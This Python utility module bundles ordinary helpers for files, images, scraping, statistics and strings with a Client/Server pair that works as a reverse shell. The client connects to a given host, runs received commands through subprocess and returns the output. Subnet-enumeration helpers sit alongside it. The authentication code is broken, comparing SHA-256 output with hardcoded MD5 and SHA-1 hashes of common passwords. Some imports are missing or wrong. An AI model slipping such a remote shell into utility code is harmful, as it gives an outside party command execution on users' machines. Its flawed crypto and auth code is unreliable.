#AUTHOR ANTHONY GRACE
#LIVE DOC UTILS
#NO RIGHTS RESERVED

import numpy as np
import matplotlib.pyplot as plt
from scipy.cluster.vq import kmeans2
from PIL import Image
from bs4 import BeautifulSoup
import requests
from scapy.all import scapy
import pyshark
import socket
import os
import subprocess
import sys
import hashlib
from cryptography.fernet import Fernet

'''
FileHandler class contains static methods to read data from and write data to a file.
ImageProcessor class contains static methods to resize, convert to grayscale, and apply filter to an image.
WebScraper class contains static methods to extract text and links from HTML and to download a file from a URL.
DataAnalyzer class contains static methods to calculate mean, median, standard deviation of a data set, plot histogram of data, and perform clustering on data.
MathUtils class contains static methods to calculate factorial and Fibonacci of a number and to solve a linear equation.
StringUtils class contains static methods to reverse, get length, convert to uppercase, and convert to lowercase a string.
Sorting class contains static methods to find the maximum of three numbers, count the number of uppercase characters in a string, and compare two strings.
Networking class contains static methods to get IP address and network IPs of a given interface name, and to find other IPs in the same network.
'''


class CryptoFunctions:
    
    def authenticate_user(self, username, password):
        # Retrieve the user's stored password hash from a database or file
        stored_hash = self.get_password_hash(username)
        
        # Hash the password entered by the user
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        
        # Compare the hashes to authenticate the user
        if password_hash == stored_hash:
            return True
        else:
            return False
    
    def get_password_hash(self, username):
        # Retrieve the stored password hash for the given username
        # This could be from a database, file, or other source
        # For this example, we'll just return a hardcoded hash
        if username == 'alice':
            return 'd033e22ae348aeb5660fc2140aec35850c4da997'
        elif username == 'bob':
            return '5f4dcc3b5aa765d61d8327deb882cf99'
        else:
            return ''
    
    def encrypt_data(self, data, key):
        # Generate a Fernet key from the provided key
        fernet_key = Fernet(key)
        
        # Encrypt the data using Fernet
        encrypted_data = fernet_key.encrypt(data.encode())
        
        return encrypted_data
    
    def decrypt_data(self, encrypted_data, key):
        # Generate a Fernet key from the provided key
        fernet_key = Fernet(key)
        
        # Decrypt the data using Fernet
        decrypted_data = fernet_key.decrypt(encrypted_data)
        
        return decrypted_data.decode()
    
    def calculate_checksum(self, data):
        # Calculate the SHA-256 hash of the data
        checksum = hashlib.sha256(data.encode()).hexdigest()
        
        return checksum
    
    def sign_message(self, message, private_key):
        # Hash the message using SHA-256
        message_hash = hashlib.sha256(message.encode()).hexdigest()
        
        # Encrypt the hash using the private key
        signature = self.encrypt_with_private_key(message_hash, private_key)
        
        return signature
    
    def verify_message(self, message, signature, public_key):
        # Hash the message using SHA-256
        message_hash = hashlib.sha256(message.encode()).hexdigest()
        
        # Decrypt the signature using the public key
        decrypted_signature = self.decrypt_with_public_key(signature, public_key)
        
        # Compare the decrypted signature to the message hash to verify the message
        if decrypted_signature == message_hash:
            return True
        else:
            return False
    
    def encrypt_with_private_key(self, plaintext, key):
        # TODO: Implement private key encryption logic
        pass
    
    def decrypt_with_public_key(self, ciphertext, key):
        # TODO: Implement public key decryption logic
        pass

#PREFIX CLASSES  HERE: ABOVE NETWORKING:


'''

client = Client(sys.argv[1], 5003)
client.run()

'''


'''

server = Server("0.0.0.0", 5003)
server.run()

'''

class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.buffer_size = 1024 * 128 # 128KB max size of messages, feel free to increase
        self.separator = "<sep>"
        self.socket = socket.socket()

    def connect(self):
        self.socket.connect((self.host, self.port))

    def send_cwd(self):
        cwd = os.getcwd()
        self.socket.send(cwd.encode())

    def receive_command(self):
        return self.socket.recv(self.buffer_size).decode()

    def send_results(self, output):
        cwd = os.getcwd()
        message = f"{output}{self.separator}{cwd}"
        self.socket.send(message.encode())

    def close(self):
        self.socket.close()

    def run(self):
        self.connect()
        self.send_cwd()
        while True:
            command = self.receive_command()
            splited_command = command.split()
            if command.lower() == "exit":
                break
            if splited_command[0].lower() == "cd":
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    output = str(e)
                else:
                    output = ""
            else:
                output = subprocess.getoutput(command)
            self.send_results(output)
        self.close()

class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.buffer_size = 1024 * 128 # 128KB max size of messages, feel free to increase
        self.separator = "<sep>"
        self.socket = socket.socket()

    def bind(self):
        self.socket.bind((self.host, self.port))

    def listen(self):
        self.socket.listen(5)

    def accept(self):
        return self.socket.accept()

    def receive_cwd(self, client_socket):
        cwd = client_socket.recv(self.buffer_size).decode()
        print("[+] Current working directory:", cwd)
        return cwd

    def send_command(self, client_socket):
        command = input(f"{self.cwd} $> ")
        if not command.strip():
            return False
        client_socket.send(command.encode())
        return command

    def send_results(self, client_socket, output):
        cwd = os.getcwd()
        message = f"{output}{self.separator}{cwd}"
        client_socket.send(message.encode())

    def close(self):
        self.socket.close()

    def run(self):
        self.bind()
        self.listen()
        print(f"Listening as {self.host}:{self.port} ...")
        client_socket, client_address = self.accept()
        print(f"{client_address[0]}:{client_address[1]} Connected!")
        self.cwd = self.receive_cwd(client_socket)
        while True:
            command = self.send_command(client_socket)
            if not command:
                continue
            if command.lower() == "exit":
                break
            output = subprocess.getoutput(command)
            self.send_results(client_socket, output)
        self.close()


'''
NETWORKING
'''



def get_ip_address(ifname):
    """Function to get the IP address of a network interface."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode())
    )[20:24])

def get_network_ips(ip_address):
    """Function to get all IP addresses on a network."""
    network = ".".join(ip_address.split(".")[:-1]) + "."
    return [network + str(i) for i in range(1, 256)]

def find_other_ips(interface_name):
    """Function to find all other IP addresses on a network."""
    ip_address = get_ip_address(interface_name)
    return get_network_ips(ip_address)



class FileHandler:
    @staticmethod
    def read_csv_file(filepath):
        with open(filepath, 'r') as f:
            data = []
            for line in f:
                data.append(line.strip().split(','))
            return data

    @staticmethod
    def write_file(data, filepath):
        with open(filepath, 'w') as f:
            for line in data:
                f.write(','.join(line) + '\n')
'''
This class contains two static methods, one for reading CSV files and one for writing files. The read_csv_file function takes a file path as input and reads the contents of the CSV file, returning the data as a list of lists. The write_file function takes a list of data and a file path as input and writes the data to a new file in a different format.
'''

class ImageProcessor:
    @staticmethod
    def resize_image(image_path, size):
        with Image.open(image_path) as img:
            img_resized = img.resize(size)
            img_resized.save('resized_image.jpg')

    @staticmethod
    def convert_to_grayscale(image_path):
        with Image.open(image_path) as img:
            img_grayscale = img.convert('L')
            img_grayscale.save('grayscale_image.jpg')

    @staticmethod
    def apply_filter(image_path, filter):
        with Image.open(image_path) as img:
            img_filtered = img.filter(filter)
            img_filtered.save('filtered_image.jpg')
'''
This class contains three static methods for resizing images, converting images to grayscale, and applying filters to images. The functions use the Pillow library to open, manipulate, and save the images.

'''

class WebScraper:
    @staticmethod
    def extract_text_from_html(html):
        soup = BeautifulSoup(html, 'html.parser')
        text = soup.get_text()
        return text

    @staticmethod
    def extract_links_from_html(html):
        soup = BeautifulSoup(html, 'html.parser')
        links = []
        for link in soup.find_all('a'):
            links.append(link.get('href'))
        return links

    @staticmethod
    def download_file_from_url(url, filepath):
        response = requests.get(url)
        with open(filepath, 'wb') as f:
            f.write(response.content)
'''
This class contains three static methods for extracting text and links from HTML pages, and for downloading files from URLs. The functions use the requests and BeautifulSoup libraries to make requests and parse HTML.
'''

class DataAnalyzer:
    @staticmethod
    def calculate_mean(data):
        return np.mean(data)

    @staticmethod
    def calculate_median(data):
        return np.median(data)

    @staticmethod
    def calculate_std_deviation(data):
        return np.std(data)

    @staticmethod
    def plot_histogram(data):
        plt.hist(data)
        plt.show()

    @staticmethod
    def perform_clustering(data, k):
        centroids, labels = kmeans2(data, k)
        return centroids, labels
'''
This class contains five static methods for calculating statistics (mean, median, and standard deviation), visualizing data with a histogram, and clustering data. The functions use the NumPy, Matplotlib, and SciPy libraries for data analysis and visualization.
'''

class MathUtils:
    @staticmethod
    def factorial(n):
        if n < 0:
            return None
        elif n == 0 or n == 1:
            return 1
        else:
            return n * MathUtils.factorial(n-1)

    @staticmethod
    def fibonacci(n):
        if n < 0:
            return None
        elif n == 0:
            return 0
        elif n == 1:
            return 1
        else:
            return MathUtils.fibonacci(n-1) + MathUtils.fibonacci(n-2)

    @staticmethod
    def solve_linear_eq(a, b):
        if a == 0:
            if b == 0:
                return "Infinite solutions"
            else:
                return "No solution"
        else:
            return -b/a
'''
This class contains three static methods, one for each mathematical operation. Static methods do not require an instance of the class to be called, so they can be called directly on the class itself. For example, to use the factorial function, you can call MathUtils.factorial(5).
'''

class StringUtils:
    @staticmethod
    def reverse_string(string):
        return string[::-1]

    @staticmethod
    def string_length(string):
        return len(string)

    @staticmethod
    def string_to_uppercase(string):
        return string.upper()

    @staticmethod
    def string_to_lowercase(string):
        return string.lower()
'''
This class contains four static methods, one for each string manipulation task. Static methods do not require an instance of the class to be called, so they can be called directly on the class itself. For example, to use the reverse_string function, you can call StringUtils.reverse_string('hello').


'''
class Sorting:
    @staticmethod
    def max_of_three(a, b, c):
        if a > b and a > c:
            return a
        elif b > a and b > c:
            return b
        else:
            return c

    @staticmethod
    def count_uppercase(string):
        count = 0
        for char in string:
            if char.isupper():
                count += 1
        return count

    @staticmethod
    def is_equal(str1, str2):
        if str1 == str2:
            print("STRING EQUAL!")
            return True
        else:
            print("STRING NOT EQUAL!")
            return False

    @staticmethod
    def is_equal_2(s1, s2):
        if len(s1) != len(s2):
            return False
        for i in range(0, len(s1)):
            if s1[i] != s2[i]:
                return False
        return True

